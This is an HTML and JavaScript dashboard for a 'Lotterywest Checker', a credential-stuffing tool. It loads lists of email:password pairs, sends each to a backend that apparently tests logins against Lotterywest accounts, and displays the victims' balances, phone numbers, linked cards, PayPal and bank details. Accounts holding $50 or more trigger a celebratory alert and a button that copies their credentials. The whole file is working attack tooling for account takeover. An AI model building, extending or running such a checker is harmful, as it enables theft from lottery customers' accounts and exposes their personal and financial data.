<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lotterywest Checker</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-deep: #0a0a0f;
            --bg-primary: #0d1117;
            --bg-secondary: #161b22;
            --bg-card: #1a1f26;
            --border: #30363d;
            --text-primary: #e6edf3;
            --text-secondary: #8b949e;
            --cyan: #00d9ff;
            --magenta: #ff00aa;
            --purple: #a855f7;
            --green: #00ff88;
            --red: #ff3366;
            --gold: #ffd700;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: 'JetBrains Mono', monospace;
            background: var(--bg-deep);
            color: var(--text-primary);
            min-height: 100vh;
            overflow-x: hidden;
        }

        /* Lottery Ball Animation */
        .lottery-ball {
            position: fixed;
            top: 20px;
            right: 20px;
            width: 80px;
            height: 80px;
            border-radius: 50%;
            background: linear-gradient(135deg, var(--red) 0%, var(--magenta) 50%, var(--purple) 100%);
            animation: ballSpin 2s linear infinite;
            box-shadow: 0 0 30px rgba(255,0,170,0.5), inset -10px -10px 20px rgba(0,0,0,0.3);
            z-index: 1000;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: 'Orbitron', sans-serif;
            font-weight: 900;
            font-size: 24px;
            color: white;
            text-shadow: 0 2px 4px rgba(0,0,0,0.5);
            cursor: pointer;
        }

        .lottery-ball::before {
            content: '';
            position: absolute;
            inset: 5px;
            border-radius: 50%;
            border: 2px solid rgba(255,255,255,0.3);
        }

        .lottery-ball.winner {
            animation: none;
            background: linear-gradient(135deg, var(--gold) 0%, var(--green) 100%);
            box-shadow: 0 0 50px var(--gold), 0 0 100px var(--green);
            transform: scale(1.5);
        }

        .lottery-ball.winner::after {
            content: '🎉';
            font-size: 40px;
            animation: winnerPulse 0.5s ease-in-out infinite;
        }

        @keyframes ballSpin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @keyframes winnerPulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.2); }
        }

        /* Fireworks */
        .firework {
            position: fixed;
            pointer-events: none;
            z-index: 999;
        }

        .firework-shell {
            position: absolute;
            width: 10px;
            height: 10px;
            border-radius: 50%;
            animation: fireworkLaunch 1s ease-out forwards;
        }

        @keyframes fireworkLaunch {
            0% { transform: translateY(0) scale(1); opacity: 1; }
            100% { transform: translateY(-200px) scale(0); opacity: 0; }
        }

        .firework-burst {
            position: absolute;
            width: 100px;
            height: 100px;
            animation: burst 0.5s ease-out forwards;
        }

        .firework-burst::before, .firework-burst::after {
            content: '';
            position: absolute;
            inset: 0;
            border-radius: 50%;
            background: radial-gradient(circle, var(--gold) 0%, transparent 70%);
            animation: sparkle 0.5s ease-out forwards;
        }

        @keyframes burst {
            0% { transform: scale(0); opacity: 1; }
            100% { transform: scale(2); opacity: 0; }
        }

        @keyframes sparkle {
            0% { transform: scale(0.5); opacity: 1; }
            100% { transform: scale(1.5); opacity: 0; }
        }

        /* Main Container */
        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }

        /* Header */
        header {
            display: flex;
            align-items: center;
            gap: 20px;
            margin-bottom: 30px;
            padding: 20px;
            background: var(--bg-card);
            border-radius: 12px;
            border: 1px solid var(--border);
        }

        .logo {
            font-family: 'Orbitron', sans-serif;
            font-size: 28px;
            font-weight: 900;
            background: linear-gradient(90deg, var(--cyan), var(--magenta));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: none;
        }

        .stats-bar {
            display: flex;
            gap: 30px;
            margin-left: auto;
        }

        .stat {
            text-align: center;
        }

        .stat-value {
            font-size: 24px;
            font-weight: 700;
            color: var(--cyan);
        }

        .stat-label {
            font-size: 12px;
            color: var(--text-secondary);
        }

        /* Controls */
        .controls {
            display: flex;
            gap: 15px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }

        .file-input-wrapper {
            position: relative;
        }

        input[type="file"] {
            display: none;
        }

        .btn {
            padding: 12px 24px;
            border: none;
            border-radius: 8px;
            font-family: inherit;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s;
        }

        .btn-primary {
            background: linear-gradient(90deg, var(--cyan), var(--magenta));
            color: white;
        }

        .btn-primary:hover {
            box-shadow: 0 0 20px rgba(0,217,255,0.5);
            transform: translateY(-2px);
        }

        .btn-secondary {
            background: var(--bg-secondary);
            color: var(--text-primary);
            border: 1px solid var(--border);
        }

        /* High Balance Section */
        .high-balance-section {
            margin-bottom: 30px;
            padding: 20px;
            background: linear-gradient(135deg, rgba(255,215,0,0.1), rgba(0,255,136,0.1));
            border: 2px solid var(--gold);
            border-radius: 12px;
            display: none;
        }

        .high-balance-section.visible {
            display: block;
        }

        .high-balance-header {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 15px;
            font-family: 'Orbitron', sans-serif;
            font-size: 18px;
            color: var(--gold);
        }

        .high-balance-list {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .high-balance-item {
            padding: 15px;
            background: var(--bg-card);
            border-radius: 8px;
            display: flex;
            align-items: center;
            gap: 15px;
            cursor: pointer;
            transition: all 0.2s;
        }

        .high-balance-item:hover {
            background: var(--bg-secondary);
            transform: translateX(5px);
        }

        .hb-balance {
            font-size: 20px;
            font-weight: 700;
            color: var(--green);
            min-width: 100px;
        }

        .hb-email {
            flex: 1;
            color: var(--text-secondary);
        }

        .hb-phone {
            color: var(--cyan);
        }

        .hb-copy {
            padding: 8px 16px;
            background: var(--bg-tertiary, #21262d);
            border: none;
            border-radius: 4px;
            color: var(--text-primary);
            cursor: pointer;
        }

        /* Tabs */
        .tabs {
            display: flex;
            gap: 5px;
            margin-bottom: 20px;
            background: var(--bg-secondary);
            padding: 5px;
            border-radius: 8px;
        }

        .tab {
            padding: 12px 24px;
            border: none;
            background: transparent;
            color: var(--text-secondary);
            font-family: inherit;
            font-size: 14px;
            cursor: pointer;
            border-radius: 6px;
            transition: all 0.2s;
        }

        .tab.active {
            background: var(--bg-card);
            color: var(--text-primary);
        }

        .tab-content {
            display: none;
        }

        .tab-content.active {
            display: block;
        }

        /* Results Table */
        .results-grid {
            display: grid;
            gap: 15px;
        }

        .result-card {
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 12px;
            overflow: hidden;
            transition: all 0.3s;
            cursor: pointer;
        }

        .result-card:hover {
            border-color: var(--cyan);
            box-shadow: 0 0 20px rgba(0,217,255,0.2);
        }

        .result-card.valid {
            border-left: 4px solid var(--green);
        }

        .result-card.invalid {
            border-left: 4px solid var(--red);
            opacity: 0.7;
        }

        /* Card Header - Always Visible */
        .card-header {
            padding: 15px 20px;
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .card-email {
            flex: 1;
            font-weight: 500;
            word-break: break-all;
        }

        .card-balance {
            font-size: 20px;
            font-weight: 700;
            color: var(--green);
        }

        .card-status {
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 500;
        }

        .card-status.valid {
            background: rgba(0,255,136,0.2);
            color: var(--green);
        }

        .card-status.invalid {
            background: rgba(255,51,102,0.2);
            color: var(--red);
        }

        /* Card Body - Expandable */
        .card-body {
            padding: 0 20px;
            max-height: 0;
            overflow: hidden;
            transition: all 0.3s ease-out;
        }

        .card-body.expanded {
            padding: 20px;
            max-height: 500px;
            border-top: 1px solid var(--border);
        }

        .detail-row {
            display: flex;
            justify-content: space-between;
            padding: 8px 0;
            border-bottom: 1px solid var(--border);
        }

        .detail-label {
            color: var(--text-secondary);
        }

        .detail-value {
            color: var(--text-primary);
            font-weight: 500;
        }

        /* Ring Graph */
        .ring-graph-container {
            padding: 20px;
            background: var(--bg-card);
            border-radius: 12px;
            margin-bottom: 20px;
        }

        .ring-graph-title {
            font-family: 'Orbitron', sans-serif;
            font-size: 16px;
            margin-bottom: 20px;
            color: var(--text-primary);
        }

        .ring-graph {
            display: flex;
            justify-content: center;
            gap: 30px;
            flex-wrap: wrap;
        }

        .ring {
            width: 150px;
            height: 150px;
            border-radius: 50%;
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .ring-spending {
            background: conic-gradient(var(--red) 0deg, var(--red) var(--spending), transparent var(--spending));
            border: 3px solid var(--red);
        }

        .ring-winnings {
            background: conic-gradient(var(--green) 0deg, var(--green) var(--winnings), transparent var(--winnings));
            border: 3px solid var(--green);
        }

        .ring-value {
            position: absolute;
            text-align: center;
        }

        .ring-amount {
            font-size: 24px;
            font-weight: 700;
        }

        .ring-label {
            font-size: 12px;
            color: var(--text-secondary);
        }

        /* Popup Modal */
        .modal-overlay {
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.8);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 2000;
        }

        .modal-overlay.visible {
            display: flex;
        }

        .modal {
            background: var(--bg-card);
            border: 2px solid var(--green);
            border-radius: 16px;
            padding: 40px;
            text-align: center;
            animation: modalPop 0.3s ease-out;
            box-shadow: 0 0 50px var(--green);
        }

        @keyframes modalPop {
            0% { transform: scale(0.5); opacity: 0; }
            100% { transform: scale(1); opacity: 1; }
        }

        .modal-amount {
            font-size: 48px;
            font-weight: 900;
            color: var(--green);
            font-family: 'Orbitron', sans-serif;
            margin: 20px 0;
        }

        .modal-message {
            font-size: 24px;
            margin-bottom: 20px;
        }

        .modal-close {
            padding: 12px 32px;
            background: var(--green);
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            color: var(--bg-deep);
        }

        /* Loading */
        .loading {
            text-align: center;
            padding: 40px;
            color: var(--text-secondary);
        }

        .spinner {
            width: 40px;
            height: 40px;
            border: 3px solid var(--border);
            border-top-color: var(--cyan);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }

        @keyframes spin {
            100% { transform: rotate(360deg); }
        }

        /* Scrollbar */
        ::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }

        ::-webkit-scrollbar-track {
            background: var(--bg-secondary);
        }

        ::-webkit-scrollbar-thumb {
            background: var(--border);
            border-radius: 4px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: var(--text-muted);
        }
    </style>
</head>
<body>
    <!-- Lottery Ball -->
    <div class="lottery-ball" id="lotteryBall">LW</div>

    <!-- Firework Container -->
    <div id="fireworks"></div>

    <!-- Balance Alert Modal -->
    <div class="modal-overlay" id="balanceModal">
        <div class="modal">
            <div class="modal-message">🎉 BALANCE ALERT! 🎉</div>
            <div class="modal-amount" id="modalAmount">$0.00</div>
            <div class="modal-message" id="modalEmail">email@example.com</div>
            <button class="modal-close" onclick="closeModal()">AWESOME!</button>
        </div>
    </div>

    <div class="container">
        <!-- Header -->
        <header>
            <div class="logo">🎰 LOTTERYWEST</div>
            <div class="stats-bar">
                <div class="stat">
                    <div class="stat-value" id="totalChecked">0</div>
                    <div class="stat-label">Checked</div>
                </div>
                <div class="stat">
                    <div class="stat-value" id="validCount">0</div>
                    <div class="stat-label">Valid</div>
                </div>
                <div class="stat">
                    <div class="stat-value" id="invalidCount">0</div>
                    <div class="stat-label">Invalid</div>
                </div>
                <div class="stat">
                    <div class="stat-value" id="highBalanceCount">0</div>
                    <div class="stat-label">$50+</div>
                </div>
            </div>
        </header>

        <!-- Controls -->
        <div class="controls">
            <div class="file-input-wrapper">
                <input type="file" id="accountFile" accept=".txt">
                <button class="btn btn-secondary" onclick="document.getElementById('accountFile').click()">
                    📁 Load Accounts
                </button>
            </div>
            <button class="btn btn-primary" id="startBtn" onclick="startChecking()">
                ▶ Start Checking
            </button>
            <button class="btn btn-secondary" onclick="exportResults()">
                💾 Export
            </button>
        </div>

        <!-- High Balance Section -->
        <div class="high-balance-section" id="highBalanceSection">
            <div class="high-balance-header">
                💰 HIGH BALANCE ACCOUNTS ($50+)
            </div>
            <div class="high-balance-list" id="highBalanceList"></div>
        </div>

        <!-- Tabs -->
        <div class="tabs">
            <button class="tab active" onclick="switchTab('results')">📋 Results</button>
            <button class="tab" onclick="switchTab('graph')">📊 Stats</button>
            <button class="tab" onclick="switchTab('raw')">📄 Raw</button>
        </div>

        <!-- Results Tab -->
        <div class="tab-content active" id="resultsTab">
            <div class="results-grid" id="resultsGrid">
                <div class="loading">
                    <div class="spinner"></div>
                    <div>Load accounts and start checking...</div>
                </div>
            </div>
        </div>

        <!-- Graph Tab -->
        <div class="tab-content" id="graphTab">
            <div class="ring-graph-container">
                <div class="ring-graph-title">📈 Last 12 Months</div>
                <div class="ring-graph">
                    <div class="ring ring-spending" style="--spending: 120deg;">
                        <div class="ring-value">
                            <div class="ring-amount" id="graphSpending">$0</div>
                            <div class="ring-label">Spending</div>
                        </div>
                    </div>
                    <div class="ring ring-winnings" style="--winnings: 90deg;">
                        <div class="ring-value">
                            <div class="ring-amount" id="graphWinnings">$0</div>
                            <div class="ring-label">Winnings</div>
                        </div>
                    </div>
                </div>
            </div>
            <div id="statsDetails"></div>
        </div>

        <!-- Raw Tab -->
        <div class="tab-content" id="rawTab">
            <pre id="rawJson" style="background: var(--bg-card); padding: 20px; border-radius: 8px; overflow: auto; max-height: 500px;"></pre>
        </div>
    </div>

    <script>
        // State
        let accounts = [];
        let results = [];
        let checking = false;
        let currentIndex = 0;

        // Audio for balance alert
        const alertSound = new Audio('data:audio/wav;base64,UklGRl9vT19XQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YV9vT19gYH9/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39gYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCg==');

        // File input handler
        document.getElementById('accountFile').addEventListener('change', async (e) => {
            const file = e.target.files[0];
            if (file) {
                const text = await file.text();
                accounts = text.split('\n').filter(line => line.trim() && line.includes(':'));
                document.getElementById('totalChecked').textContent = accounts.length;
                renderResults();
            }
        });

        // Tab switching
        function switchTab(tabName) {
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
            event.target.classList.add('active');
            document.getElementById(tabName + 'Tab').classList.add('active');
        }

        // Render results grid
        function renderResults() {
            const grid = document.getElementById('resultsGrid');
            if (results.length === 0) {
                grid.innerHTML = '<div class="loading"><div class="spinner"></div><div>Load accounts and start checking...</div></div>';
                return;
            }
            grid.innerHTML = results.map((r, i) => `
                <div class="result-card ${r.status}" onclick="toggleCard(${i})">
                    <div class="card-header">
                        <div class="card-email">${r.email}</div>
                        <div class="card-balance">${r.balance || '$0.00'}</div>
                        <div class="card-status ${r.status}">${r.status}</div>
                    </div>
                    <div class="card-body" id="card-${i}">
                        <div class="detail-row"><span class="detail-label">Password</span><span class="detail-value">${r.password}</span></div>
                        <div class="detail-row"><span class="detail-label">Balance</span><span class="detail-value">${r.balance || 'N/A'}</span></div>
                        <div class="detail-row"><span class="detail-label">Weekly Limit</span><span class="detail-value">${r.weekly_spend_limit || 'N/A'}</span></div>
                        <div class="detail-row"><span class="detail-label">Phone</span><span class="detail-value">${r.phone || 'N/A'}</span></div>
                        <div class="detail-row"><span class="detail-label">Current Draws</span><span class="detail-value">${r.current_draws || '0'}</span></div>
                        <div class="detail-row"><span class="detail-label">Last Deposit</span><span class="detail-value">${r.last_deposit || 'N/A'}</span></div>
                        <div class="detail-row"><span class="detail-label">Deposit Method</span><span class="detail-value">${r.last_deposit_method || 'N/A'}</span></div>
                        <div class="detail-row"><span class="detail-label">Total Spending</span><span class="detail-value">${r.total_spending || 'N/A'}</span></div>
                        <div class="detail-row"><span class="detail-label">Total Winnings</span><span class="detail-value">${r.total_winnings || 'N/A'}</span></div>
                        <div class="detail-row"><span class="detail-label">Cards</span><span class="detail-value">${r.cards || 'None'}</span></div>
                        <div class="detail-row"><span class="detail-label">PayPal</span><span class="detail-value">${r.paypal || 'No'}</span></div>
                        <div class="detail-row"><span class="detail-label">Bank</span><span class="detail-value">${r.bank || 'Not set'}</span></div>
                        ${event.target.classList.contains('winner') ? '<div style="color:var(--green);font-weight:700;">🎉 WINNER!</div>' : ''}
                    </div>
                </div>
            `).join('');
        }

        // Toggle card expand
        function toggleCard(index) {
            const body = document.getElementById('card-' + index);
            if (body) {
                body.classList.toggle('expanded');
            }
        }

        // Update stats
        function updateStats() {
            const valid = results.filter(r => r.status === 'valid' || r.status === 'VALID').length;
            const invalid = results.filter(r => r.status === 'invalid' || r.status === 'INVALID').length;
            const highBal = results.filter(r => r.balance && parseFloat(r.balance.replace(/[$,]/g, '')) >= 50).length;
            
            document.getElementById('validCount').textContent = valid;
            document.getElementById('invalidCount').textContent = invalid;
            document.getElementById('highBalanceCount').textContent = highBal;

            // Show high balance section
            if (highBal > 0) {
                document.getElementById('highBalanceSection').classList.add('visible');
                const hbList = document.getElementById('highBalanceList');
                hbList.innerHTML = results.filter(r => r.balance && parseFloat(r.balance.replace(/[$,]/g, '')) >= 50).map(r => `
                    <div class="high-balance-item">
                        <div class="hb-balance">${r.balance}</div>
                        <div class="hb-email">${r.email}</div>
                        <div class="hb-phone">${r.phone || ''}</div>
                        <button class="hb-copy" onclick="copyCredentials('${r.email}','${r.password}')">Copy</button>
                    </div>
                `).join('');
            }

            // Update ring graph
            let totalSpending = 0, totalWinnings = 0;
            results.forEach(r => {
                if (r.total_spending) totalSpending += parseFloat(r.total_spending.replace(/[$,]/g, '')) || 0;
                if (r.total_winnings) totalWinnings += parseFloat(r.total_winnings.replace(/[$,]/g, '')) || 0;
            });
            document.getElementById('graphSpending').textContent = '$' + totalSpending.toFixed(2);
            document.getElementById('graphWinnings').textContent = '$' + totalWinnings.toFixed(2);

            // Max for ring percentages (max 360deg)
            const maxVal = Math.max(totalSpending, totalWinnings, 1);
            document.querySelector('.ring-spending').style.setProperty('--spending', (totalSpending / maxVal * 360) + 'deg');
            document.querySelector('.ring-winnings').style.setProperty('--winnings', (totalWinnings / maxVal * 360) + 'deg');

            // Update raw JSON
            document.getElementById('rawJson').textContent = JSON.stringify(results, null, 2);
        }

        // Fireworks effect
        function triggerFirework() {
            const container = document.getElementById('fireworks');
            for (let i = 0; i < 5; i++) {
                setTimeout(() => {
                    const fw = document.createElement('div');
                    fw.className = 'firework';
                    fw.style.left = Math.random() * window.innerWidth + 'px';
                    fw.style.top = Math.random() * window.innerHeight/2 + 'px';
                    fw.innerHTML = '<div class="firework-shell"></div><div class="firework-burst"></div>';
                    container.appendChild(fw);
                    setTimeout(() => fw.remove(), 1000);
                }, i * 200);
            }
        }

        // Win animation for lottery ball
        function triggerWin(email) {
            const ball = document.getElementById('lotteryBall');
            ball.classList.add('winner');
            ball.textContent = '🎉';
            triggerFirework();
            
            // Play sound
            alertSound.currentTime = 0;
            alertSound.play().catch(() => {});

            setTimeout(() => {
                ball.classList.remove('winner');
                ball.textContent = 'LW';
            }, 3000);
        }

        // Show balance modal
        function showBalanceModal(email, amount) {
            document.getElementById('modalAmount').textContent = amount;
            document.getElementById('modalEmail').textContent = email;
            document.getElementById('balanceModal').classList.add('visible');
            
            // Play sound
            alertSound.currentTime = 0;
            alertSound.play().catch(() => {});
        }

        function closeModal() {
            document.getElementById('balanceModal').classList.remove('visible');
        }

        // Copy credentials
        function copyCredentials(email, password) {
            navigator.clipboard.writeText(email + ':' + password);
            alert('Copied: ' + email + ':' + password);
        }

        // Start checking (simulated - in real use would connect to backend)
        async function startChecking() {
            if (checking || accounts.length === 0) return;
            checking = true;
            document.getElementById('startBtn').textContent = '⏹ Stop';
            
            const socket = new WebSocket('ws://' + location.host + '/ws');
            
            socket.onmessage = (e) => {
                const data = JSON.parse(e.data);
                if (data.type === 'result') {
                    results.push(data);
                    const balance = parseFloat((data.balance || '$0').replace(/[$,]/g, ''));
                    if (balance >= 50) {
                        showBalanceModal(data.email, data.balance);
                        triggerWin(data.email);
                    }
                    renderResults();
                    updateStats();
                    document.getElementById('totalChecked').textContent = results.length;
                }
            };

            for (let i = 0; i < accounts.length; i++) {
                if (!checking) break;
                const [email, password] = accounts[i].split(':');
                socket.send(JSON.stringify({email, password}));
                await new Promise(r => setTimeout(r, 3000));
            }
            
            checking = false;
            document.getElementById('startBtn').textContent = '▶ Start Checking';
        }

        // Export
        function exportResults() {
            const blob = new Blob([JSON.stringify(results, null, 2)], {type: 'application/json'});
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'lotterywest_results.json';
            a.click();
        }

        // Poll for updates from backend
        setInterval(async () => {
            try {
                const r = await fetch('/api/results');
                if (r.ok) {
                    const data = await r.json();
                    results = data.results || [];
                    renderResults();
                    updateStats();
                }
            } catch {}
        }, 2000);
    </script>
</body>
</html>
